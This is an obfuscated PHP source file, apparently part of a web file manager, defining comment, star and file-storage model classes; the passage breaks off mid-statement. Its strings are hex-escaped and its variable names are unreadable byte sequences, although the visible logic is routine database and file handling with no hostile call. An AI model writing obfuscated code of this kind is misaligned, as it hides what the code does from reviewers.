<?php
 goto AÜÌ…ÏøĞĞ; a­•…ï‡©µ: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\x6d\x65\x6e\164"; protected $tableMeta = array("\x74\141\142\154\x65\116\x61\155\x65" => "\143\157\x6d\155\145\x6e\x74\137\x6d\x65\x74\141", "\155\x65\164\x61\x46\x69\x65\x6c\x64" => "\143\x6f\x6d\155\x65\156\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($‡‰êìŸ) { $•½ªø® =& $_SERVER[¡¬ıÜ ƒ]; if ($‡‰êìŸ[$•½ªø®[2015]]) { $„Ğ¢–Ôå = $this->where(array($•½ªø®[2016] => $‡‰êìŸ[$•½ªø®[2015]]))->find(); if (!$„Ğ¢–Ôå || $„Ğ¢–Ôå[$•½ªø®[190]] != $‡‰êìŸ[$•½ªø®[190]] || $„Ğ¢–Ôå[$•½ªø®[571]] != $‡‰êìŸ[$•½ªø®[571]]) { return !1; } $this->where(array($•½ªø®[2016] => $‡‰êìŸ[$•½ªø®[2015]]))->setAdd($•½ªø®[2017], 1); } $‡‰êìŸ[$•½ªø®[2018]] = 0; $‡‰êìŸ[$•½ªø®[2017]] = 0; $‡‰êìŸ[$•½ªø®[830]] = 1; return $this->add($‡‰êìŸ); } public function commentCount($†»áŞ¸î, $ÁéÎ©í†, $¼ûÀ×Éç = false) { $Æğ¯Ñ =& $_SERVER[¡¬ıÜ ƒ]; if (!$†»áŞ¸î) { return array(); } if (is_string($†»áŞ¸î) || is_int($†»áŞ¸î)) { $†»áŞ¸î = array($†»áŞ¸î); } $À‡Œœ´ = array($Æğ¯Ñ[571], $Æğ¯Ñ[2019] => $Æğ¯Ñ[567]); $µŸ†›–š = array($Æğ¯Ñ[571] => array($Æğ¯Ñ[7], $†»áŞ¸î), $Æğ¯Ñ[190] => $ÁéÎ©í†); if ($¼ûÀ×Éç) { $µŸ†›–š[$Æğ¯Ñ[1785]] = $¼ûÀ×Éç; } $ûÆ¯ôø° = $this->field($À‡Œœ´)->where($µŸ†›–š)->group($Æğ¯Ñ[571])->select(); return array_to_keyvalue($ûÆ¯ôø°, $Æğ¯Ñ[571], $Æğ¯Ñ[567]); } public function starTarget($ôÛªË£, $ä—²ÒÖ™) { $´åíº›Æ =& $_SERVER[¡¬ıÜ ƒ]; $Ä¤¢±…“ = $ôÛªË£ + self::TYPE_STAR_OFFSET; $Ô¢á¯ß = array($´åíº›Æ[1785] => USER_ID, $´åíº›Æ[190] => $Ä¤¢±…“, $´åíº›Æ[571] => $ä—²ÒÖ™); $ëÈ•£ÙÃ = $this->where($Ô¢á¯ß)->find(); if ($ëÈ•£ÙÃ) { return $this->where(array($´åíº›Æ[477] => $ëÈ•£ÙÃ[$´åíº›Æ[477]]))->delete(); } $Îû•ˆ†• = array($´åíº›Æ[2015] => 0, $´åíº›Æ[1785] => USER_ID, $´åíº›Æ[830] => 1, $´åíº›Æ[171] => $´åíº›Æ[12], $´åíº›Æ[190] => $Ä¤¢±…“, $´åíº›Æ[571] => $ä—²ÒÖ™, $´åíº›Æ[2018] => 0, $´åíº›Æ[2017] => 0); return $this->add($Îû•ˆ†•); } public function starTargetCount($ÃÁ€€, $³Ÿô¹ƒ¿) { $ß”›¹‚Û =& $_SERVER[¡¬ıÜ ƒ]; $Ôßˆªü˜ = $³Ÿô¹ƒ¿ + self::TYPE_STAR_OFFSET; $´òÇîœ§ = $this->commentCount($ÃÁ€€, $Ôßˆªü˜); $¸Ä²ÉÍ˜ = $this->commentCount($ÃÁ€€, $Ôßˆªü˜, USER_ID); return array($ß”›¹‚Û[2020] => $´òÇîœ§, $ß”›¹‚Û[2021] => $¸Ä²ÉÍ˜); } public function starTargetUserList($ŸŞÀØÖ×, $ñ‰ò‡ó) { $ÒÍßó÷ =& $_SERVER[¡¬ıÜ ƒ]; $°ùíğŠÓ = $ŸŞÀØÖ× + self::TYPE_STAR_OFFSET; $Ÿ×œƒÊ = array($ÒÍßó÷[571] => $ñ‰ò‡ó, $ÒÍßó÷[190] => $°ùíğŠÓ); $Ç«ü´· = $this->where($Ÿ×œƒÊ)->count(); $œ¨Š½÷ã = array($ÒÍßó÷[334] => $Ç«ü´·, $ÒÍßó÷[2022] => array()); if (!$Ç«ü´·) { return $œ¨Š½÷ã; } $Ø¡ı€Â = $this->field($ÒÍßó÷[1785])->where($Ÿ×œƒÊ)->limit(500)->select(); $Ø¡ı€Â = array_to_keyvalue($Ø¡ı€Â, $ÒÍßó÷[12], $ÒÍßó÷[1785]); $œ¨Š½÷ã[$ÒÍßó÷[2022]] = Model($ÒÍßó÷[579])->userListInfo($Ø¡ı€Â); return $œ¨Š½÷ã; } public function prasiseUserList($ÜÑŸÍÆÚ) { $¹â‡¥˜ù =& $_SERVER[¡¬ıÜ ƒ]; $„ºãÊÀ = array($¹â‡¥˜ù[2023] => $ÜÑŸÍÆÚ); $¦ÆÊÅ©ô = $this->where($„ºãÊÀ)->find(); $³´ë±Ó± = _get($¦ÆÊÅ©ô, $¹â‡¥˜ù[2018], 0); $¸‡İ¼†Ó = array($¹â‡¥˜ù[334] => $³´ë±Ó±, $¹â‡¥˜ù[2022] => array()); if (!$³´ë±Ó±) { return $¸‡İ¼†Ó; } $ö­‘•“ò = Model($¹â‡¥˜ù[2024])->field($¹â‡¥˜ù[1785])->where($„ºãÊÀ)->limit(500)->select(); $ö­‘•“ò = array_to_keyvalue($ö­‘•“ò, $¹â‡¥˜ù[12], $¹â‡¥˜ù[1785]); $¸‡İ¼†Ó[$¹â‡¥˜ù[2022]] = Model($¹â‡¥˜ù[579])->userListInfo($ö­‘•“ò); return $¸‡İ¼†Ó; } public function remove($éÓáÁø) { $Äú¿¼ÜÜ =& $_SERVER[¡¬ıÜ ƒ]; $µ×Ì»í = array($Äú¿¼ÜÜ[2016] => $éÓáÁø); $äç¾­Ö‘ = $this->where($µ×Ì»í)->find(); if ($äç¾­Ö‘[$Äú¿¼ÜÜ[2015]]) { $this->where(array($Äú¿¼ÜÜ[2016] => $äç¾­Ö‘[$Äú¿¼ÜÜ[2015]]))->setAdd($Äú¿¼ÜÜ[2017], -1); } return $this->where($µ×Ì»í)->delete(); } public function edit($€Ö€Ñğ¡, $ó£¦ğä¹) { $ïµœÕ¤ =& $_SERVER[¡¬ıÜ ƒ]; $¦ö£–¬Ë = array($ïµœÕ¤[2016] => $€Ö€Ñğ¡); return $this->where($¦ö£–¬Ë)->save(array($ïµœÕ¤[2025] => $ó£¦ğä¹)); } public function prasise($´–ğŞ¯ò) { $¢‘¢²˜Ÿ =& $_SERVER[¡¬ıÜ ƒ]; $ÁÃÄÅíÂ = Model($¢‘¢²˜Ÿ[2026]); $¶àÉÇÌ = array($¢‘¢²˜Ÿ[2016] => $´–ğŞ¯ò, $¢‘¢²˜Ÿ[1776] => USER_ID); $ìõ¼áÊï = $ÁÃÄÅíÂ->where($¶àÉÇÌ)->find(); if (!$ìõ¼áÊï) { $ÁÃÄÅíÂ->add($¶àÉÇÌ); $ÀŠÔÂ¶ = $this->where(array($¢‘¢²˜Ÿ[2016] => $´–ğŞ¯ò))->setAdd($¢‘¢²˜Ÿ[2018], 1); } else { $ÁÃÄÅíÂ->where($¶àÉÇÌ)->delete(); $ÀŠÔÂ¶ = $this->where(array($¢‘¢²˜Ÿ[2016] => $´–ğŞ¯ò))->setAdd($¢‘¢²˜Ÿ[2018], -1); } return $ÀŠÔÂ¶; } public function targetInfo($åàÎ¥öù, $Ì£äÈ) { $İÙˆ³ =& $_SERVER[¡¬ıÜ ƒ]; $àéÍËÎ— = array($İÙˆ³[653] => $åàÎ¥öù, $İÙˆ³[654] => $Ì£äÈ); $Ü´‹Û…í = $this->where($àéÍËÎ—)->count(); $ëƒ¤•Ùô = "\122\x49\107\x48\x54\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\143\x6f\x6d\x6d\x65\156\x74\x5f\x70\x72\141\x69\x73\x65\x20\163\x74\x61\x72\x20\x6f\156\x20\x63\157\x6d\x6d\x65\x6e\x74\56\143\157\155\x6d\x65\x6e\164\x49\104\x20\75\40\x73\x74\x61\162\x2e\143\157\155\x6d\x65\156\164\x49\104"; $—›îğÑ = $this->alias($İÙˆ³[431])->where($àéÍËÎ—)->join($ëƒ¤•Ùô, $İÙˆ³[2027])->count(); $ä‘™™íè = array($İÙˆ³[2028] => $Ü´‹Û…í, $İÙˆ³[2029] => $—›îğÑ); return $ä‘™™íè; } public function listData($½ñ¬¶„¤) { $©¯ïæşÎ =& $_SERVER[¡¬ıÜ ƒ]; if (isset($½ñ¬¶„¤[$©¯ïæşÎ[2030]])) { if ($½ñ¬¶„¤[$©¯ïæşÎ[2030]]) { $½ñ¬¶„¤[$©¯ïæşÎ[2023]] = array($©¯ïæşÎ[1102], intval($½ñ¬¶„¤[$©¯ïæşÎ[2030]])); } unset($½ñ¬¶„¤[$©¯ïæşÎ[2030]]); } if (isset($½ñ¬¶„¤[$©¯ïæşÎ[2031]])) { if ($½ñ¬¶„¤[$©¯ïæşÎ[2031]]) { $½ñ¬¶„¤[$©¯ïæşÎ[2023]] = array($©¯ïæşÎ[1099], intval($½ñ¬¶„¤[$©¯ïæşÎ[2031]])); } unset($½ñ¬¶„¤[$©¯ïæşÎ[2031]]); } return $this->_listData($½ñ¬¶„¤); } private function _listData($ì‡¥Öš¬) { $€†ü¬‚× =& $_SERVER[¡¬ıÜ ƒ]; $»ëæ™«· = $this->where($ì‡¥Öš¬)->_makeOrder()->selectPage(100); $this->_listAppendParent($»ëæ™«·[$€†ü¬‚×[447]]); $this->_listAppendUser($»ëæ™«·[$€†ü¬‚×[447]]); $this->_listAppendMeta($»ëæ™«·[$€†ü¬‚×[447]]); return $»ëæ™«·; } private function _makeOrder() { $€ÁµÇË‡ =& $_SERVER[¡¬ıÜ ƒ]; $Ë›Ñœ’ = array($€ÁµÇË‡[2018], $€ÁµÇË‡[2017], $€ÁµÇË‡[233]); $İ¶Œ¾ø¦ = Input::get($€ÁµÇË‡[532], $€ÁµÇË‡[7], $€ÁµÇË‡[499], $Ë›Ñœ’); $İ±Ôæ­ = Input::get($€ÁµÇË‡[533], $€ÁµÇË‡[7], $€ÁµÇË‡[1778], array($€ÁµÇË‡[2032], $€ÁµÇË‡[528])); $î—ÕÁõŞ = $İ¶Œ¾ø¦ . $€ÁµÇË‡[53] . $İ±Ôæ­; return $this->order($î—ÕÁõŞ); } private function _listAppendParent(&$‘§àö·ñ) { $õÕ—«£’ =& $_SERVER[¡¬ıÜ ƒ]; $¸ñÇåÑá = array_unique(array_to_keyvalue($‘§àö·ñ, $õÕ—«£’[12], $õÕ—«£’[2015])); $¸ñÇåÑá = array_remove_value($¸ñÇåÑá, $õÕ—«£’[230]); if (!$¸ñÇåÑá) { return; } $ÂĞ÷±‰ = $this->where(array($õÕ—«£’[2016] => array($õÕ—«£’[7], $¸ñÇåÑá)))->select(); $ÂĞ÷±‰ = array_to_keyvalue($ÂĞ÷±‰, $õÕ—«£’[2023]); foreach ($‘§àö·ñ as &$û¿ÁøÂ) { if (isset($ÂĞ÷±‰[$û¿ÁøÂ[$õÕ—«£’[2015]]])) { $û¿ÁøÂ[$õÕ—«£’[2033]] = $ÂĞ÷±‰[$û¿ÁøÂ[$õÕ—«£’[2015]]]; } } unset($û¿ÁøÂ); } private function _listAppendUser(&$¨«¥ üß) { $ï£ŒŞã– =& $_SERVER[¡¬ıÜ ƒ]; $ÛòÏÃ§ = array_unique(array_to_keyvalue($¨«¥ üß, $ï£ŒŞã–[12], $ï£ŒŞã–[1785])); $ÛòÏÃ§ = array_remove_value($ÛòÏÃ§, $ï£ŒŞã–[230]); if (count($ÛòÏÃ§) == 0) { return; } foreach ($¨«¥ üß as $¨§Ÿ™®Ş) { if (isset($¨§Ÿ™®Ş[$ï£ŒŞã–[2033]])) { $ÛòÏÃ§[] = $¨§Ÿ™®Ş[$ï£ŒŞã–[2033]][$ï£ŒŞã–[1785]]; } } $¶ä”Á = Model($ï£ŒŞã–[599])->userListInfo($ÛòÏÃ§); foreach ($¨«¥ üß as &$¨§Ÿ™®Ş) { $¨§Ÿ™®Ş[$ï£ŒŞã–[667]] = $¶ä”Á[$¨§Ÿ™®Ş[$ï£ŒŞã–[1785]]]; if (isset($¨§Ÿ™®Ş[$ï£ŒŞã–[2033]])) { $¨§Ÿ™®Ş[$ï£ŒŞã–[2033]][$ï£ŒŞã–[667]] = $¶ä”Á[$¨§Ÿ™®Ş[$ï£ŒŞã–[2033]][$ï£ŒŞã–[1785]]]; } } unset($¨§Ÿ™®Ş); } private function _listAppendMeta(&$Ø÷¡¡ü) { $óØÕÃ™¶ =& $_SERVER[¡¬ıÜ ƒ]; $”àÎËù = array_unique(array_to_keyvalue($Ø÷¡¡ü, $óØÕÃ™¶[12], $óØÕÃ™¶[2023])); $”àÎËù = array_remove_value($”àÎËù, $óØÕÃ™¶[230]); if (!$”àÎËù) { return; } foreach ($Ø÷¡¡ü as $•Æø÷õÍ) { if (isset($•Æø÷õÍ[$óØÕÃ™¶[2033]])) { $”àÎËù[] = $•Æø÷õÍ[$óØÕÃ™¶[2033]][$óØÕÃ™¶[2023]]; } } $ôÎÆõÏ· = $this->metaList($”àÎËù); if (!$ôÎÆõÏ·) { return !1; } foreach ($Ø÷¡¡ü as &$•Æø÷õÍ) { $•Æø÷õÍ[$óØÕÃ™¶[541]] = $ôÎÆõÏ·[$•Æø÷õÍ[$óØÕÃ™¶[2023]]]; if (isset($•Æø÷õÍ[$óØÕÃ™¶[2033]])) { $•Æø÷õÍ[$óØÕÃ™¶[2033]][$óØÕÃ™¶[541]] = $ôÎÆõÏ·[$•Æø÷õÍ[$óØÕÃ™¶[2033]][$óØÕÃ™¶[2023]]]; } } unset($•Æø÷õÍ); } private function metaList($óÎöŒÁ) { $ğƒ­‚“’ =& $_SERVER[¡¬ıÜ ƒ]; if (!$óÎöŒÁ) { return array(); } $ˆ†×¡ı = array($ğƒ­‚“’[2023] => array($ğƒ­‚“’[7], $óÎöŒÁ)); $øã¯ÎÕ = Model($ğƒ­‚“’[2034])->where($ˆ†×¡ı)->select(); $øã¯ÎÕ = array_to_keyvalue_group($øã¯ÎÕ, $ğƒ­‚“’[2023]); foreach ($øã¯ÎÕ as $ÀˆÂÔèú => $Ğˆ”ÁÜ) { $Î¹‚ ¦¶ = array(); foreach ($Ğˆ”ÁÜ as $ã¿¯Ÿô) { $Î¹‚ ¦¶[$ã¿¯Ÿô[$ğƒ­‚“’[97]]] = $ã¿¯Ÿô[$ğƒ­‚“’[452]]; } $øã¯ÎÕ[$ÀˆÂÔèú] = $Î¹‚ ¦¶; } return $øã¯ÎÕ ? $øã¯ÎÕ : array(); } public function removeTarget($Ş ÅÊÉ³, $Ş÷ŠÚ€¹) { $ á¥Â­´ =& $_SERVER[¡¬ıÜ ƒ]; if (!$Ş÷ŠÚ€¹) { return !0; } $Ş÷ŠÚ€¹ = is_array($Ş÷ŠÚ€¹) ? $Ş÷ŠÚ€¹ : array($Ş÷ŠÚ€¹); $§êÄå˜Ù = array($ á¥Â­´[190] => $Ş ÅÊÉ³, $ á¥Â­´[571] => array($ á¥Â­´[7], $Ş÷ŠÚ€¹)); $äËÙƒ™™ = $this->field($ á¥Â­´[2023])->where($§êÄå˜Ù)->select(); $Ò¤Ä±  = array_to_keyvalue($äËÙƒ™™, $ á¥Â­´[12], $ á¥Â­´[2023]); if (!$Ò¤Ä± ) { return !0; } $§êÄå˜Ù = array($ á¥Â­´[2023] => array($ á¥Â­´[7], $Ò¤Ä± )); $this->where($§êÄå˜Ù)->delete(); Model($ á¥Â­´[2026])->where($§êÄå˜Ù)->delete(); Model($ á¥Â­´[2035])->where($§êÄå˜Ù)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\146\x69\154\x65\x5f\143\x6f\156\x74\145\156\x74\x73"; protected $dataAuto = array(array("\x63\162\145\x61\x74\145\124\151\155\145", "\164\x69\x6d\x65", "\x69\x6e\x73\145\162\164", "\x66\x75\x6e\x63\164\151\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\151\x6c\145"; protected $tableMeta = array("\164\x61\142\154\145\116\141\155\145" => "\x69\x6f\137\x66\x69\x6c\145\137\x6d\145\x74\141", "\155\145\x74\141\x46\151\x65\154\x64" => "\146\151\x6c\x65\111\x44"); public function fileInfo($ ±í Úİ) { $Ì™Æò³˜ =& $_SERVER[¡¬ıÜ ƒ]; static $»«½ñÓ = array(); if (!isset($»«½ñÓ[$ ±í Úİ])) { $é¼ÛÒû = $Ì™Æò³˜[2036]; $“¥„ú‘Ò = Model($Ì™Æò³˜[546])->field($é¼ÛÒû)->where(array($Ì™Æò³˜[544] => $ ±í Úİ))->find(); $»«½ñÓ[$ ±í Úİ] = $“¥„ú‘Ò; } return $»«½ñÓ[$ ±í Úİ]; } public function addFileByContent($«é¥±´Ø = '', $Ìî—™³Ó = '') { $ÖíüÚ¬µ =& $_SERVER[¡¬ıÜ ƒ]; $˜Â¸ó«€ = TEMP_PATH . $ÖíüÚ¬µ[2037]; if (!is_dir($˜Â¸ó«€)) { mk_dir($˜Â¸ó«€); } $³İ¸¢·æ = $˜Â¸ó«€ . $ÖíüÚ¬µ[2038] . rand_string(16); file_put_contents($³İ¸¢·æ, $«é¥±´Ø); $¬³´óÓš = $this->addFile($³İ¸¢·æ, $Ìî—™³Ó, !0); if (file_exists($³İ¸¢·æ)) { @unlink($³İ¸¢·æ); } return $¬³´óÓš; } public function createFileName($ëÅÊ˜’á, $–°è‚“Ù = false, $óŞå˜ = false) { $ úÊ…Ì =& $_SERVER[¡¬ıÜ ƒ]; $ÉŸµ§Ü¸ = IO::init($ úÊ…Ì[8]); $‰íÊÕ = $this->makeFilePath($ëÅÊ˜’á, $ÉŸµ§Ü¸, $–°è‚“Ù, $óŞå˜); $Ì¸ÎÚŠ = $ÉŸµ§Ü¸->pathFather($‰íÊÕ); static $‚€ÄÖåÈ = false; $ íÈáã÷ = $ úÊ…Ì[2039] . md5($Ì¸ÎÚŠ); if (!$‚€ÄÖåÈ && !Cache::get($ íÈáã÷)) { $‚€ÄÖåÈ = !0; $âŠÇŒ€¥ = IO::mkdir($Ì¸ÎÚŠ); if (!IO::exist($âŠÇŒ€¥ . $ úÊ…Ì[886])) { IO::mkfile($âŠÇŒ€¥ . $ úÊ…Ì[886]); } Cache::set($ íÈáã÷, 1, 3600 * 2); } return $‰íÊÕ; } public function makeFilePath($ˆà¤Âü, $¾•Â¿¡“, $›ÇŞÄı = false, $®é¢Ûô = false) { $ÈÁêí§Ş =& $_SERVER[¡¬ıÜ ƒ]; $û´ÉÉÅ¤ = Model($ÈÁêí§Ş[850])->get($ÈÁêí§Ş[2040]); $€Å¥î®‰ = KodIO::defaultIO() . date($ÈÁêí§Ş[2041]); $Ú©÷şà“ = $€Å¥î®‰ . rand_string(5) . short_id(100); $ˆà¤Âü = str_replace($ÈÁêí§Ş[8], $ÈÁêí§Ş[11], KodIO::clear($ˆà¤Âü)); $Ï’˜±Ÿ« = $¾•Â¿¡“->ext($ˆà¤Âü); if (!$ˆà¤Âü) { $û´ÉÉÅ¤ = $ÈÁêí§Ş[856]; } switch ($û´ÉÉÅ¤) { case $ÈÁêí§Ş[2042]: if ($Ï’˜±Ÿ«) { $Ú©÷şà“ = $Ú©÷şà“ . $ÈÁêí§Ş[10] . $Ï’˜±Ÿ«; } if ($Ï’˜±Ÿ« == $ÈÁêí§Ş[1978]) { $Ú©÷şà“ .= $ÈÁêí§Ş[1302]; } break; case $ÈÁêí§Ş[2043]: $í´ë×™Š = Model($ÈÁêí§Ş[850])->get($ÈÁêí§Ş[851]); $êÄï§‰ = substr(md5($ÈÁêí§Ş[852] . $í´ë×™Š . date($ÈÁêí§Ş[829])), 0, 8); $š±½ß = KodIO::defaultDriver(); $€Å¥î®‰ = $ÈÁêí§Ş[1333] . $š±½ß[$ÈÁêí§Ş[477]] . $ÈÁêí§Ş[486] . date($ÈÁêí§Ş[2044]) . $êÄï§‰ . $ÈÁêí§Ş[8]; if ($Ï’˜±Ÿ« == $ÈÁêí§Ş[1978]) { $ˆà¤Âü .= $ÈÁêí§Ş[1302]; } $àİÁã™© = $ÈÁêí§Ş[2045] . $€Å¥î®‰ . $ˆà¤Âü; CacheLock::lock($àİÁã™©); $Ú©÷şà“ = $€Å¥î®‰ . $ˆà¤Âü; if (IO::exist($€Å¥î®‰ . $ˆà¤Âü)) { $õ¾»§†« = substr($ˆà¤Âü, 0, strlen($ˆà¤Âü) - strlen($Ï’˜±Ÿ«)); $¦Üàûƒ’ = $®é¢Ûô ? substr($®é¢Ûô, 0, 5) : ($›ÇŞÄı ? substr($›ÇŞÄı, 0, 5) : rand_string(5)); $Ú©÷şà“ = $€Å¥î®‰ . $õ¾»§†« . $¦Üàûƒ’; if ($Ï’˜±Ÿ«) { $Ú©÷şà“ = $Ú©÷şà“ . $ÈÁêí§Ş[10] . $Ï’˜±Ÿ«; } } if (IO::isOsDriver($Ú©÷şà“) && !IO::isUploadServer($Ú©÷şà“)) { if (IO::exist($Ú©÷şà“)) { CacheLock::unlock($àİÁã™©); return $Ú©÷şà“; } $±Ú“Úƒş = IO::setContent($Ú©÷şà“, $ÈÁêí§Ş[12]); if (!$±Ú“Úƒş) { show_json($ÈÁêí§Ş[2046], !1); } } CacheLock::unlock($àİÁã™©); break; case $ÈÁêí§Ş[856]: break; default: break; } return $Ú©÷şà“; } public function addFileByRemote($Š÷“‚òŠ, $µ‹‚–’, $Øğ„çÇÍ = array()) { $¶ŸƒáÅØ =& $_SERVER[¡¬ıÜ ƒ]; if (!IO::exist($Š÷“‚òŠ)) { return !1; } $¢Ü¹®—Ë = $Øğ„çÇÍ[$¶ŸƒáÅØ[549]] ? $Øğ„çÇÍ[$¶ŸƒáÅØ[549]] : $¶ŸƒáÅØ[12]; $ï•£¤™Ì = IO::hashMd5($Š÷“‚òŠ, $¢Ü¹®—Ë); $ûƒñôÌ = KodIO::defaultDriver(); $Ö²ä‚²À = array($¶ŸƒáÅØ[622] => IO::size($Š÷“‚òŠ), $¶ŸƒáÅØ[2047] => 1, $¶ŸƒáÅØ[496] => $µ‹‚–’, $¶ŸƒáÅØ[898] => $ûƒñôÌ[$¶ŸƒáÅØ[477]], $¶ŸƒáÅØ[497] => $Š÷“‚òŠ, $¶ŸƒáÅØ[2048] => $Øğ„çÇÍ[$¶ŸƒáÅØ[677]] ? $Øğ„çÇÍ[$¶ŸƒáÅØ[677]] : IO::hashSimple($Š÷“‚òŠ), $¶ŸƒáÅØ[2049] => $ï•£¤™Ì ? $ï•£¤™Ì : $¢Ü¹®—Ë); if ($ˆ‚Ú´ª¶ = $this->addFileCheckExist($Ö²ä‚²À[$¶ŸƒáÅØ[677]], $Ö²ä‚²À[$¶ŸƒáÅØ[549]], $Ö²ä‚²À[$¶ŸƒáÅØ[79]])) { return $ˆ‚Ú´ª¶; } return $this->addFileData($Ö²ä‚²À); } private function addFileData($õÊçĞÊû) { $„ù’õÜã =& $_SERVER[¡¬ıÜ ƒ]; if (!$õÊçĞÊû) { return !1; } $õÊçĞÊû[$„ù’õÜã[79]] = intval($õÊçĞÊû[$„ù’õÜã[79]]); if (!$õÊçĞÊû[$„ù’õÜã[79]] && strlen($õÊçĞÊû[$„ù’õÜã[677]]) > 32) { $õÊçĞÊû[$„ù’õÜã[79]] = intval(substr($õÊçĞÊû[$„ù’õÜã[677]], 32)); } $Òàç¨İ = $this->add($õÊçĞÊû); return $this->find($Òàç¨İ); } public function addFile($£Á¡ï¸“, $®øŒÒ±, $²ñËú¬ = false) { $²ŞÀ´Œ =& $_SERVER[¡¬ıÜ ƒ]; $…³úşøã = IO::hashSimple($£Á¡ï¸“); $‚İ¸ŞÍæ = IO::size($£Á¡ï¸“); $š¸Æ£ÄÚ = $‚İ¸ŞÍæ <= 1024 * 1024 * 10 ? IO::hashMd5($£Á¡ï¸“) : $²ŞÀ´Œ[12]; $Ï¼àÓÙõ = $²ŞÀ´Œ[2050] . $…³úşøã; CacheLock::lock($Ï¼àÓÙõ); if ($š¸Æ£ÄÚ && $…³úşøã) { $Şúö¾ª‹ = $this->addFileCheckExist($…³úşøã, $š¸Æ£ÄÚ, $‚İ¸ŞÍæ); if ($Şúö¾ª‹) { CacheLock::unlock($Ï¼àÓÙõ); return $Şúö¾ª‹; } } $å±ö­Ã¶ = $this->addFileMake($£Á¡ï¸“, $‚İ¸ŞÍæ, $…³úşøã, $š¸Æ£ÄÚ, $®øŒÒ±, $²ñËú¬); $öËæ£áÂ = $this->addFileData($å±ö­Ã¶); CacheLock::unlock($Ï¼àÓÙõ); if (!$š¸Æ£ÄÚ && $öËæ£áÂ) { $this->fileMd5Check($öËæ£áÂ); } return $öËæ£áÂ; } public function fileMd5Check($ì¶È¨Ûí) { $‹…ë†ÌÈ =& $_SERVER[¡¬ıÜ ƒ]; $Úãş¤—Ã = array($ì¶È¨Ûí[$‹…ë†ÌÈ[543]], $ì¶È¨Ûí[$‹…ë†ÌÈ[87]]); $é»ùç›ê = $‹…ë†ÌÈ[2051] . $ì¶È¨Ûí[$‹…ë†ÌÈ[87]]; $¢¡×É = $‹…ë†ÌÈ[2052] . $ì¶È¨Ûí[$‹…ë†ÌÈ[543]]; TaskQueue::add($‹…ë†ÌÈ[2053], $Úãş¤—Ã, $é»ùç›ê, $¢¡×É); } public function fileMd5Set($ØÜÎòÄ’, $Öã¿öÚ) { $åèÙôıœ =& $_SERVER[¡¬ıÜ ƒ]; $º­áƒ—Ê = $this->find($ØÜÎòÄ’); if (!$º­áƒ—Ê || $º­áƒ—Ê[$åèÙôıœ[549]]) { return; } $µ‹øØÁÈ = IO::hashMd5($Öã¿öÚ); if (!$µ‹øØÁÈ) { return $åèÙôıœ[12]; } $this->where(array($åèÙôıœ[543] => $ØÜÎòÄ’))->save(array($åèÙôıœ[549] => $µ‹øØÁÈ)); } public function addFileMake($óòõ¦ºÌ, $úÎ¿ÌÉà, $ Èù¥å½, $ñ»Œ†¸¡, $ªø–ÇÔ•, $ç„ÇõÎ) { $™Á®£şÏ =& $_SERVER[¡¬ıÜ ƒ]; $ôöÖ–¥ = $this->createFileName($ªø–ÇÔ•, $ Èù¥å½, $ñ»Œ†¸¡); $ôç™ûÑŒ = get_path_father($ôöÖ–¥); $Éù±Í˜Ş = get_path_this($ôöÖ–¥); if ($ç„ÇõÎ) { $õúíáı = IO::move($óòõ¦ºÌ, $ôç™ûÑŒ, !1, $Éù±Í˜Ş); } else { $õúíáı = IO::copy($óòõ¦ºÌ, $ôç™ûÑŒ, !1, $Éù±Í˜Ş); } if (!$õúíáı) { return !1; } $Ë Ş……§ = KodIO::defaultDriver(); $°„¶äÍ = array($™Á®£şÏ[622] => $úÎ¿ÌÉà, $™Á®£şÏ[2047] => 1, $™Á®£şÏ[496] => $ªø–ÇÔ•, $™Á®£şÏ[898] => $Ë Ş……§[$™Á®£şÏ[477]], $™Á®£şÏ[497] => $ôöÖ–¥, $™Á®£şÏ[2048] => $ Èù¥å½, $™Á®£şÏ[2049] => $ñ»Œ†¸¡); return $°„¶äÍ; } public function addFileCheckExist($ŠÜ¦äæ‘, $ÀŒé˜÷•, $Õ¯µš…É) { $íœş“›¿ =& $_SERVER[¡¬ıÜ ƒ]; $ÑŞ¼‡ëä = $this->findByHash($ŠÜ¦äæ‘, $ÀŒé˜÷•); if (!$ÑŞ¼‡ëä) { return !1; } $ºë­‹£Ä = array($íœş“›¿[2047] => intval($ÑŞ¼‡ëä[$íœş“›¿[2054]]) + 1, $íœş“›¿[622] => $Õ¯µš…É); $this->where(array($íœş“›¿[544] => $ÑŞ¼‡ëä[$íœş“›¿[543]]))->save($ºë­‹£Ä); return $ÑŞ¼‡ëä; } public function remove($òıç¶÷ø) { $this->linkCountChange($òıç¶÷ø, !1); $this->clearEmpty(); return !0; } public function linkAdd($üßÉŞ§…) { $this->linkCountChange($üßÉŞ§…, !0); } public function linkCountChange($ñÜúøæÇ, $Ä÷œ¿ß²) { $È­•éÒÆ =& $_SERVER[¡¬ıÜ ƒ]; if (!$ñÜúøæÇ) { return; } if (!is_array($ñÜúøæÇ)) { $ñÜúøæÇ = array($ñÜúøæÇ); } $Û³™ë›Ë = array(); foreach ($ñÜúøæÇ as $…‰§Ó˜) { $äÅ‰Ó“ = $…‰§Ó˜ . $È­•éÒÆ[12]; if (!$Û³™ë›Ë[$äÅ‰Ó“]) { $Û³™ë›Ë[$äÅ‰Ó“] = 0; } $Û³™ë›Ë[$äÅ‰Ó“]++; } $Æ›Ú©¼ı = array(); foreach ($Û³™ë›Ë as $…‰§Ó˜ => $•©ıà») { $äÅ‰Ó“ = $•©ıà» . $È­•éÒÆ[12]; if (!$Æ›Ú©¼ı[$äÅ‰Ó“]) { $Æ›Ú©¼ı[$äÅ‰Ó“] = array(); } $Æ›Ú©¼ı[$äÅ‰Ó“][] = $…‰§Ó˜; } foreach ($Æ›Ú©¼ı as $•©ıà» => $›èÑ¯Ø) { if (!$›èÑ¯Ø) { continue; } $•©ıà» = $Ä÷œ¿ß² ? $•©ıà» : -intval($•©ıà»); $±â¡ş¹ú = array($È­•éÒÆ[543] => array($È­•éÒÆ[7], $›èÑ¯Ø)); if ($•©ıà» < 0) { $±â¡ş¹ú[$È­•éÒÆ[2054]] = array($È­•éÒÆ[1103], abs($•©ıà»)); } $this->where($±â¡ş¹ú)->setAdd($È­•éÒÆ[2054], 